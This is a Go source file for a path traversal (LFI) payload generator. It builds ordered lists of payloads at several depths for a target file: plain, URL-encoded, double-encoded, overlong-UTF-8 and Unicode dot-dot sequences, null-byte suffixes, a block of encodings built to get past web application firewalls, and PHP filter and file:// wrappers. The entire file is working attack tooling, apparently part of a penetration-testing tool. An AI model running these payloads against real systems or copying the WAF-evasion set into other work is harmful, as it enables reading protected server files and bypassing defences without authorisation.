// Package traversal generates LFI path traversal payloads for a given target
// file and traversal depth. Payloads are ordered from most to least likely to
// succeed: plain sequences first, then encoded variants, then exotic techniques,
// then PHP/file URI wrappers.
package traversal

import "strings"

// Payload is a single LFI traversal payload with metadata describing the
// technique used. Category is either "traversal" or "wrapper".
type Payload struct {
	Value     string
	Technique string
	Category  string
}

// Generate returns an ordered slice of traversal payloads for targetPath at
// depths 1..maxDepth. targetPath should be a relative path (leading slashes
// are stripped). maxDepth caps the number of directory-traversal levels.
func Generate(targetPath string, maxDepth int) []Payload {
	if maxDepth <= 0 {
		maxDepth = 1
	}
	// Strip leading slashes so callers can pass "/etc/passwd" or "etc/passwd".
	targetPath = strings.TrimLeft(targetPath, "/")

	var payloads []Payload

	// ── Plain traversal sequences ─────────────────────────────────────────────

	// ../  (Unix)
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("../", d) + targetPath,
			Technique: "dotdot-slash",
			Category:  "traversal",
		})
	}

	// ..\  (Windows)
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("..\\", d) + targetPath,
			Technique: "dotdot-backslash",
			Category:  "traversal",
		})
	}

	// ....// (redundant-separator technique — bypasses naive strip of "../")
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("....//", d) + targetPath,
			Technique: "dotdotdotdot-doubleslash",
			Category:  "traversal",
		})
	}

	// ── URL-encoded variants ──────────────────────────────────────────────────

	// %2e%2e%2f — full URL encoding of "../"
	// Targets decoders that apply URL decoding before path normalisation.
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("%2e%2e%2f", d) + targetPath,
			Technique: "url-encoded",
			Category:  "traversal",
		})
	}

	// %2e%2e/ — dots encoded, slash plain
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("%2e%2e/", d) + targetPath,
			Technique: "url-encoded-dots",
			Category:  "traversal",
		})
	}

	// ..%2f — slash encoded, dots plain
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("..%2f", d) + targetPath,
			Technique: "url-encoded-slash",
			Category:  "traversal",
		})
	}

	// %252e%252e%252f — double URL-encoded (percent itself encoded as %25)
	// Targets servers that URL-decode twice before path resolution.
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("%252e%252e%252f", d) + targetPath,
			Technique: "double-url-encoded",
			Category:  "traversal",
		})
	}

	// ── Unicode / overlong encoding ───────────────────────────────────────────

	// %c0%ae%c0%ae%c0%af — overlong UTF-8 encoding of "../"
	// Overlong UTF-8 encoding targets path decoders that normalise after the
	// access-control check, allowing bypasses on older JVMs and some PHP
	// configurations. (%c0%ae = '.', %c0%af = '/')
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("%c0%ae%c0%ae%c0%af", d) + targetPath,
			Technique: "overlong-utf8",
			Category:  "traversal",
		})
	}

	// %uff0e%uff0e%u2215 — Unicode fullwidth variants
	// Targets Windows IIS and some legacy Java containers that normalise
	// fullwidth Unicode characters to their ASCII equivalents.
	// (%uff0e = fullwidth '.', %u2215 = division slash '∕')
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("%uff0e%uff0e%u2215", d) + targetPath,
			Technique: "unicode-fullwidth",
			Category:  "traversal",
		})
	}

	// ── Null-byte suffix variants ─────────────────────────────────────────────
	// Null-byte injection truncates the string in legacy PHP (pre-5.3.4) and
	// some C-based file open implementations, stripping any suffix appended
	// by the application after the user-controlled path.

	for d := 1; d <= maxDepth; d++ {
		base := strings.Repeat("../", d) + targetPath
		payloads = append(payloads, Payload{
			Value:     base + "%00",
			Technique: "null-byte-percent",
			Category:  "traversal",
		})
	}

	for d := 1; d <= maxDepth; d++ {
		base := strings.Repeat("../", d) + targetPath
		payloads = append(payloads, Payload{
			Value:     base + "\x00",
			Technique: "null-byte-raw",
			Category:  "traversal",
		})
	}

	// Absolute path — no traversal prefix; useful when the application
	// concatenates a base dir with user input and the base dir can be escaped
	// by providing an absolute path that overwrites it.
	payloads = append(payloads, Payload{
		Value:     "/" + targetPath,
		Technique: "absolute-path",
		Category:  "traversal",
	})

	// ── WAF-evasion encodings ─────────────────────────────────────────────────
	// These variants target web application firewalls and naive input filters
	// that pattern-match on the literal "../" or "..\\" sequence. The payloads
	// below still normalise to "../" on the server but evade signature matching.

	// ..%252f — mixed double-encoding: dots plain, slash double-URL-encoded.
	// Slips past WAF rules keyed on "%2f" while still decoding to "../" on
	// servers that URL-decode twice before path resolution.
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("..%252f", d) + targetPath,
			Technique: "waf-double-slash",
			Category:  "traversal",
		})
	}

	// ..%c0%af — dots plain, slash as overlong-UTF8 "/".
	// Bypasses filters that decode standard percent-encoding but not overlong
	// UTF-8, common on older JVM/IIS stacks behind a WAF.
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("..%c0%af", d) + targetPath,
			Technique: "waf-overlong-slash",
			Category:  "traversal",
		})
	}

	// ..%5c — Windows backslash URL-encoded.
	// Targets Windows back-ends behind a WAF that only blocks forward-slash
	// traversal; the OS treats "\\" as a path separator.
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("..%5c", d) + targetPath,
			Technique: "waf-encoded-backslash",
			Category:  "traversal",
		})
	}

	// ./../ — leading dot-slash noise prefix. Some WAF normalisers collapse
	// "./" but the surviving "../" still traverses; defeats rules that only
	// inspect the first few characters of the value.
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     "./" + strings.Repeat("../", d) + targetPath,
			Technique: "waf-dotslash-prefix",
			Category:  "traversal",
		})
	}

	// ..%00/ — interstitial null byte inside the sequence. A null embedded
	// between the dots and slash can split a WAF's pattern match while being
	// stripped by the back-end before path resolution.
	for d := 1; d <= maxDepth; d++ {
		payloads = append(payloads, Payload{
			Value:     strings.Repeat("..%00/", d) + targetPath,
			Technique: "waf-null-interstitial",
			Category:  "traversal",
		})
	}

	// ── Wrapper techniques ────────────────────────────────────────────────────
	// PHP stream wrappers bypass include() path resolution entirely.
	// Only applicable when the target interprets the value as a PHP stream.

	payloads = append(payloads, Payload{
		Value:     "php://filter/convert.base64-encode/resource=" + targetPath,
		Technique: "php-filter",
		Category:  "wrapper",
	})

	payloads = append(payloads, Payload{
		Value:     "file:///" + targetPath,
		Technique: "file-uri",
		Category:  "wrapper",
	})

	return payloads
}

// Techniques returns the set of technique identifiers Generate can emit, in
// the same order Generate produces them. Useful for validating a caller's
// --techniques selection and for documentation/help output.
func Techniques() []string {
	return []string{
		"dotdot-slash",
		"dotdot-backslash",
		"dotdotdotdot-doubleslash",
		"url-encoded",
		"url-encoded-dots",
		"url-encoded-slash",
		"double-url-encoded",
		"overlong-utf8",
		"unicode-fullwidth",
		"null-byte-percent",
		"null-byte-raw",
		"absolute-path",
		"waf-double-slash",
		"waf-overlong-slash",
		"waf-encoded-backslash",
		"waf-dotslash-prefix",
		"waf-null-interstitial",
		"php-filter",
		"file-uri",
	}
}

// GenerateFiltered behaves like Generate but keeps only payloads whose
// Technique is present in the include set. A nil or empty include set means
// "all techniques" (identical to Generate). Unknown technique names in the
// include set are ignored here; callers should validate against Techniques()
// first if they want to reject typos. The returned slice preserves Generate's
// most-to-least-likely ordering.
func GenerateFiltered(targetPath string, maxDepth int, include []string) []Payload {
	all := Generate(targetPath, maxDepth)
	if len(include) == 0 {
		return all
	}
	want := make(map[string]bool, len(include))
	for _, t := range include {
		want[t] = true
	}
	filtered := make([]Payload, 0, len(all))
	for _, p := range all {
		if want[p.Technique] {
			filtered = append(filtered, p)
		}
	}
	return filtered
}
